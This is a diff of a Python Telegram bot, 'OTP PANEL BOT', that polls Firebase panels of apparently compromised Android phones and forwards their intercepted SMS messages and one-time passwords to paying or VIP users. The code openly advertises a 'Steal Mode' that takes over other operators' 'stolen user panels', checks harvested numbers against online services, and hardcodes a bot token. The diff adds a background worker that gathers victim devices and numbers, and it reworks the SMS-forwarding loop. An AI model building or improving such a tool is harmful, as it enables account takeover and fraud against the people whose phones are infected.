@@ -2,10 +2,9 @@
 """
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — PRIVATE ADMIN EDITION           
-  Enterprise Worker Architecture + MICRO-POLLING (OOM FIX)
-  + Strict 1-Hour Fast Inbox + Background Ghost Workers
+  Dual-Engine Architecture (Zero-Hang / Instant Reply)
+  + Micro-Polling + Background Cache Worker
   + Referral System + Strict Force Join + Steal Mode
-  + ZERO-RAM OVERLOAD (Hacker Type Stream Fetch)
 ══════════════════════════════════════════════════════
 """
 
@@ -51,7 +50,7 @@ TOKEN           = "8839521261:AAFjpwMHtt3TtECRmfKHirqUw0i7tPUQRpQ"
 BOT_USERNAME    = "offermeeshobot"
 
 ADMIN_IDS: set[int] = {
-    6860106371, 8306147833,
+    6860106371, 8306147833
 }
 
 FORCE_JOIN_CHATS = [
@@ -67,7 +66,7 @@ SYS_DIR = os.path.join(DB_DIR, "System")
 SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
 
 seen_ids:  set[str] = set()   
-first_run: bool     = True
+is_syncing: bool    = True
 _main_app: Optional[Application] = None
 _http_session: Optional[aiohttp.ClientSession] = None
 start_time = time.time()
@@ -467,18 +466,6 @@ def load_data():
                     all_users[uid].setdefault("user_panels_mode", False)
             except: pass
                 
-    for fname in os.listdir(CLONES_DIR):
-        if fname.endswith(".json"):
-            try:
-                with open(os.path.join(CLONES_DIR, fname), "r", encoding="utf-8") as f:
-                    cdata = json.load(f)
-                    restored_users = {int(k): v for k, v in cdata.get("users", {}).items()}
-                    cdata["users"] = restored_users
-                    token = cdata.get("bot_token")
-                    if token:
-                        CLONES[token] = cdata
-            except: pass
-            
     for adm in ADMIN_IDS:
         if adm not in all_users:
             all_users[adm] = {
@@ -628,7 +615,7 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
     tlog(f"Telegram API Error: {err_str}")
 
 # ═══════════════════════════════════════════════════════
-#  FAST HTTP SESSION MANAGER (LOW RAM LIMITS)
+#  FAST HTTP SESSION MANAGER
 # ═══════════════════════════════════════════════════════
 
 async def get_http_session() -> aiohttp.ClientSession:
@@ -736,57 +723,8 @@ async def verify_recent_sms(device, max_age_sec=1800) -> tuple[bool, float]:
     except: pass
     return False, 0.0
 
-async def continuous_prefetch_worker(service: str):
-    while True:
-        try:
-            pool = PREFETCH_POOL.setdefault(service, [])
-            if len(pool) >= 5: 
-                await asyncio.sleep(5)
-                continue
-                
-            all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
-            if not all_devices:
-                await asyncio.sleep(5)
-                continue
-                
-            fresh_devices = []
-            for d in all_devices:
-                if d.status == "online" and d.numbers:
-                    is_valid, last_ts = await verify_recent_sms(d, max_age_sec=1800) 
-                    if is_valid:
-                        d.last_sms_ts = last_ts
-                        fresh_devices.append(d)
-                        
-            if not fresh_devices:
-                await asyncio.sleep(10)
-                continue
-                
-            random.shuffle(fresh_devices)
-            in_pool_nums = {item["num"] for item in pool}
-            
-            for d in fresh_devices[:30]:
-                num = d.numbers[0]
-                if num in in_pool_nums:
-                    continue
-                    
-                seen = False
-                for cid, s_set in user_seen_unreg.items():
-                    if num in s_set: seen = True
-                if seen: continue
-                    
-                res = await check_number_api(service, num)
-                if isinstance(res, dict) and not res.get("status") == "error":
-                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
-                    if not is_reg:
-                        pool.append({"device": d, "res": res, "num": num})
-                        break 
-                        
-                await asyncio.sleep(0.5)
-        except Exception: pass
-        await asyncio.sleep(3)
-
 # ═══════════════════════════════════════════════════════
-#  ON-DEMAND CHUNKED FETCHER (ZERO CRASH & ZERO WAIT)
+#  ON-DEMAND CACHE (INSTANT RESPONSE FIX)
 # ═══════════════════════════════════════════════════════
 
 async def fetch_db_data(tag: str, url: str) -> list[Device]:
@@ -829,13 +767,10 @@ async def fetch_db_data(tag: str, url: str) -> list[Device]:
                 for dev_id, client in clients_all.items():
                     if dev_id in added_set: continue
                     if not isinstance(client, dict): continue
-                    
                     sim_list = client.get("sims", [])
                     s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
                     s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
-                    
                     nums = extract_all_nums(client, s1, s2)
-                    
                     if not nums and not client.get("modelName"): continue
                     added_set.add(dev_id)
                     model = client.get("modelName") or f"Device-{dev_id[:6]}"
@@ -876,23 +811,20 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
     missing_tasks = []
     missing_tags = []
 
+    # 🔴 INSTANT HANG FIX: ONLY fetch CUSTOM user panels on-demand, NEVER global 300+ panels.
     for tag, url in target_dbs:
         if tag in GLOBAL_DEVICE_CACHE:
             devices.extend(GLOBAL_DEVICE_CACHE[tag])
-        else:
+        elif tag.startswith("U_"): 
             missing_tasks.append(fetch_db_data(tag, url))
             missing_tags.append(tag)
 
     if missing_tasks:
-        for i in range(0, len(missing_tasks), 20):
-            c_tasks = missing_tasks[i:i+20]
-            c_tags = missing_tags[i:i+20]
-            results = await asyncio.gather(*c_tasks, return_exceptions=True)
-            for tag, res in zip(c_tags, results):
-                if isinstance(res, list):
-                    GLOBAL_DEVICE_CACHE[tag] = res
-                    devices.extend(res)
-            await asyncio.sleep(0.2)
+        results = await asyncio.gather(*missing_tasks, return_exceptions=True)
+        for tag, res in zip(missing_tags, results):
+            if isinstance(res, list):
+                GLOBAL_DEVICE_CACHE[tag] = res
+                devices.extend(res)
 
     unique_devices = []
     seen_ids_set = set()
@@ -916,7 +848,7 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
         all_users[chat_id]["user_panels_mode"] = False
         save_user(chat_id)
         if _main_app:
-            asyncio.create_task(_main_app.bot.send_message(chat_id, "⚠️ **GHOST MODE AUTO-OFF:** Stolen User panels are currently empty or offline. Reverted back to default panels.", parse_mode="Markdown"))
+            asyncio.create_task(_main_app.bot.send_message(chat_id, "⚠️ **GHOST MODE AUTO-OFF:** Stolen User panels are currently empty or offline. Reverted back to 300+ global panels.", parse_mode="Markdown"))
         return await get_all_devices(bot_token, chat_id, users_db, auto_fallback=False)
         
     return unique_devices
@@ -1251,6 +1183,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 # ═══════════════════════════════════════════════════════
 
 async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    global is_syncing
     query   = update.callback_query
     data    = query.data or ""
     chat_id = query.message.chat_id
@@ -1302,9 +1235,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if data.startswith("auto_fb:"):
             service = data.split(":")[1]
             
-            if service not in PREFETCH_TASKS:
-                PREFETCH_TASKS[service] = asyncio.create_task(continuous_prefetch_worker(service))
-                
             pool = PREFETCH_POOL.setdefault(service, [])
             seen_set = user_seen_unreg.setdefault(chat_id, set())
             
@@ -1512,7 +1442,10 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             pending_action.pop(chat_id, None)
             devices = await get_all_devices(bot_token, chat_id, users_db)
             if not devices:
-                await safe_edit(query, "📭 0 Devices Found. You need to 'Add Custom Panel' first, or have Admin/VIP access.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
+                if is_syncing and (chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("vip_until", 0) > time.time()):
+                    await safe_edit(query, "⏳ **System Syncing...**\n\nBot abhi live devices fetch kar raha hai. Kripya 10-15 seconds wait karein aur phir se click karein.", parse_mode="Markdown")
+                else:
+                    await safe_edit(query, "❌ No devices found. Please Add Custom Panels or Refer to get VIP Global access.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                 return
             await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
             return
@@ -1720,12 +1653,16 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text(admin_panel_text(bot_token, chat_id), reply_markup=admin_keyboard(bot_token, chat_id))
         return
 
+    # 🟢 INSTANT HANG FIX: No 300+ Fetching inside Message Handler!
     if text == "Devices List":
         user_focus.setdefault(bot_token, {}).pop(chat_id, None)
         pending_action.pop(chat_id, None)
         devices = await get_all_devices(bot_token, chat_id, users_db)
         if not devices:
-            await update.message.reply_text("📭 0 Devices Found. Ensure you've added a panel or have VIP access.")
+            if is_syncing and (chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("vip_until", 0) > time.time()):
+                await update.message.reply_text("⏳ **System Syncing...**\n\nBot abhi live devices fetch kar raha hai. Kripya 10-15 seconds wait karein aur phir se click karein.", parse_mode="Markdown")
+            else:
+                await update.message.reply_text("❌ Aapke paas abhi koi active devices nahi hain. 'Add Custom Panel' se panel add karein ya VIP lein.")
             return
         await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
         return
@@ -1895,47 +1832,90 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
 # ═══════════════════════════════════════════════════════
-#  FIREBASE MICRO-POLLER (OOM ZERO RAM FIX)
+#  WORKER 1: BACKGROUND CACHE ENGINE
 # ═══════════════════════════════════════════════════════
 
-async def _forward_sms(device: Device, sms: dict) -> None:
-    global total_otps_processed
-    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
-    if not body: return
+async def cache_sync_worker():
+    global is_syncing
+    while True:
+        try:
+            dbs_to_poll = dict(DATABASES)
+            for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
+                dbs_to_poll[f"G_{i}"] = g_url
+                    
+            for uid, uinfo in all_users.items():
+                for i, db_url in enumerate(get_user_dbs(uinfo)):
+                    dbs_to_poll[f"U_{uid}_{i}"] = db_url
 
-    total_otps_processed += 1
-    label = device_label(device)
-    otp   = extract_otp(body)
-    msg_text = auto_forward_msg(sms, label)
-    
-    master_log_sms(", ".join(device.numbers) if device.numbers else device.id[:8], body, otp)
-    
-    kb_rows = []
-    if otp: kb_rows.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
-    kb_rows.append([
-        InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{device.id}"),
-        InlineKeyboardButton("Device Info",  callback_data=f"info:{device.id}"),
-    ])
-    markup = InlineKeyboardMarkup(kb_rows)
-
-    send_tasks = []
-
-    for bot_token, chat_dict in list(user_focus.items()):
-        app_to_use = _main_app
-        if not app_to_use: continue
-
-        focused_chats = [cid for cid, did in chat_dict.items() if did == device.id]
-        
-        for chat_id in set(focused_chats):
-            if otp: 
-                all_users.setdefault(chat_id, {})["otp_count"] = all_users.get(chat_id, {}).get("otp_count", 0) + 1
-                save_user(chat_id)
-            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup))
+            all_devices_gathered = []
+            items = list(dbs_to_poll.items())
             
-    if send_tasks:
-        await asyncio.gather(*send_tasks, return_exceptions=True)
+            for i in range(0, len(items), 10):
+                chunk = items[i:i+10]
+                tasks = [fetch_db_data(tag, url) for tag, url in chunk]
+                res = await asyncio.gather(*tasks, return_exceptions=True)
+                for (tag, url), r in zip(chunk, res):
+                    if isinstance(r, list):
+                        GLOBAL_DEVICE_CACHE[tag] = r
+                        all_devices_gathered.extend(r)
+                await asyncio.sleep(0.5) 
+                gc.collect() 
+                
+            unique_devices = []
+            seen_ids_cache = set()
+            seen_numbers = set()
 
-# 🔴 MICRO-POLLING: Fetch only last 3 msgs per panel (saves RAM!)
+            for d in all_devices_gathered:
+                if d.id in seen_ids_cache:
+                    continue
+                seen_ids_cache.add(d.id)
+                if d.numbers:
+                    new_nums = [num for num in d.numbers if num not in seen_numbers]
+                    if not new_nums:
+                        continue 
+                    d.numbers = new_nums
+                    seen_numbers.update(new_nums)
+                unique_devices.append(d)
+
+            unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
+            GLOBAL_DEVICE_CACHE["ALL"] = unique_devices
+            is_syncing = False # 🟢 First boot complete, remove Wait Message flag
+
+        except Exception as e:
+            tlog(f"Cache Worker Error: {e}")
+            
+        await asyncio.sleep(60)
+
+# ═══════════════════════════════════════════════════════
+#  WORKER 2: MICRO-POLLING (LIVE SMS ENGINE)
+# ═══════════════════════════════════════════════════════
+
+async def poll_loop(app: Application) -> None:
+    global first_run, _main_app
+    _main_app = app
+    
+    while is_syncing:
+        await asyncio.sleep(1) # Wait for initial cache
+        
+    first_run = False
+    tlog("Private Bot Engine ready! Micro-Polling active...")
+    
+    while True:
+        try:
+            active_devices = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.status == "online"]
+            
+            for i in range(0, len(active_devices), 50):
+                chunk = active_devices[i:i+50]
+                tasks = [poll_device_sms(d) for d in chunk]
+                await asyncio.gather(*tasks, return_exceptions=True)
+                await asyncio.sleep(0.1)
+                
+        except Exception as e:
+            tlog(f"Polling Exception: {e}")
+            await asyncio.sleep(5)
+            
+        await asyncio.sleep(POLL_INTERVAL)
+
 async def poll_device_sms(device: Device):
     try:
         session = await get_http_session()
@@ -1961,34 +1941,38 @@ async def poll_device_sms(device: Device):
                             except: pass
                             
                         if not is_recent: continue
-                        await _forward_sms(device, sms)
+                        
+                        # Forward SMS instantly
+                        body = sms.get("body") or sms.get("message") or sms.get("text") or ""
+                        if not body: continue
+                        otp = extract_otp(body)
+                        msg_text = auto_forward_msg(sms, device_label(device))
+                        master_log_sms(", ".join(device.numbers) if device.numbers else device.id[:8], body, otp)
+                        
+                        kb_rows = []
+                        if otp: kb_rows.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
+                        kb_rows.append([
+                            InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{device.id}"),
+                            InlineKeyboardButton("Device Info",  callback_data=f"info:{device.id}")
+                        ])
+                        markup = InlineKeyboardMarkup(kb_rows)
+
+                        send_tasks = []
+                        for bot_token, chat_dict in list(user_focus.items()):
+                            if not _main_app: continue
+                            focused_chats = [cid for cid, did in chat_dict.items() if did == device.id]
+                            for chat_id in set(focused_chats):
+                                if otp: 
+                                    all_users.setdefault(chat_id, {})["otp_count"] = all_users.get(chat_id, {}).get("otp_count", 0) + 1
+                                    save_user(chat_id)
+                                send_tasks.append(_main_app.bot.send_message(chat_id, msg_text, reply_markup=markup))
+                                
+                        if send_tasks:
+                            await asyncio.gather(*send_tasks, return_exceptions=True)
     except: pass
 
-async def poll_loop(app: Application) -> None:
-    global first_run, _main_app
-    _main_app = app
-    
-    first_run = False
-    tlog("Private Bot Engine ready! Micro-Polling active...")
-    
-    while True:
-        try:
-            active_devices = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.status == "online"]
-            
-            for i in range(0, len(active_devices), 50):
-                chunk = active_devices[i:i+50]
-                tasks = [poll_device_sms(d) for d in chunk]
-                await asyncio.gather(*tasks, return_exceptions=True)
-                await asyncio.sleep(0.1)
-                
-        except Exception as e:
-            tlog(f"Polling Exception: {e}")
-            await asyncio.sleep(5)
-            
-        await asyncio.sleep(POLL_INTERVAL)
-
 # ═══════════════════════════════════════════════════════
-#  MAIN ENTRY POINT (LOW RAM LIMITS)
+#  MAIN ENTRY POINT (CRASH PROOF)
 # ═══════════════════════════════════════════════════════
 
 def main() -> None:
@@ -2018,6 +2002,7 @@ def main() -> None:
 
     async def post_init(application: Application) -> None:
         load_data()
+        asyncio.create_task(cache_sync_worker()) 
         asyncio.create_task(poll_loop(application)) 
         asyncio.create_task(auto_save_loop())
         asyncio.create_task(hourly_admin_backup(application))
